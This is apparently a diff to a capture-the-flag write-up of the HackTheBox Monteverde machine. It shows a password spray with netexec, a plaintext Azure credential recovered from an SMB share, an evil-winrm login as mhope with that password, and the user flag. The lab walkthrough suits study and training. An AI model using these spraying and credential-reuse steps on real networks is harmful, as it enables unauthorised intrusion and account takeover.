@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags:
+tags: sprayingattack weakpassword bruteforce smbclient rpcclient netexec azure
 ---
 
 <br />
@@ -206,11 +206,11 @@ smorgan
 
 <br />
 
-At this point, we can attempt a Spray Attack with this usernames.
+At this point, we can attempt a `spray attack` with these usernames.
 
 While it may seem naive, it's not uncommon for corporate users to use their usernames as passwords.
 
-To perform this attack, we will run `netexec` using the `--continue-on-success` flag. By this way, the program will continue running including after a valid match.
+To perform this attack, we will run `netexec` using the `--continue-on-success` flag. This way, the tool will continue trying all credentials even after a valid match is found.
 
 <br />
 
@@ -233,7 +233,7 @@ SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJo
 
 <br />
 
-In this case, we get a single match - valid credentials for the `SABatchJobs` user: `SABatchJobs:SABatchJobs`.
+We get a single match - valid credentials for the `SABatchJobs` user: `SABatchJobs:SABatchJobs`.
 
 <br />
 
@@ -300,4 +300,80 @@ getting file \mhope\azure.xml of size 1212 as mhope/azure.xml (6,6 KiloBytes/sec
 
 <br />
 
+Running `tree`, we see more clearly the content structure:
 
+<br />
+
+```bash
+❯ tree
+.
+├── dgalanos
+├── mhope
+│   └── azure.xml
+├── roleary
+└── smorgan
+
+5 directories, 1 file
+```
+
+<br />
+
+There is only one file called `azure.xml` inside `mhope's` directory.
+
+Let's see its content:
+
+<br />
+
+```xml
+❯ /usr/bin/cat azure.xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
+    <Props>
+      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
+      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
+      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
+      <S N="Password">4n0therD4y@n0th3r$</S>
+    </Props>
+  </Obj>
+</Objs
+```
+
+<br />
+
+We have a new password: `4n0therD4y@n0th3r$`.
+
+As mentioned earlier, the file was located in `mhope's` directory, so we can try authenticating via `WinRM` as this user:
+
+<br />
+
+```bash
+❯ evil-winrm -i MEGABANK.LOCAL -u mhope -p 4n0therD4y@n0th3r$
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
+megabank\mhope
+```
+
+<br />
+
+And get the `user.txt` flag:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
+73e55ef7037471404768494546xxxxxx
+```
+
+<br />
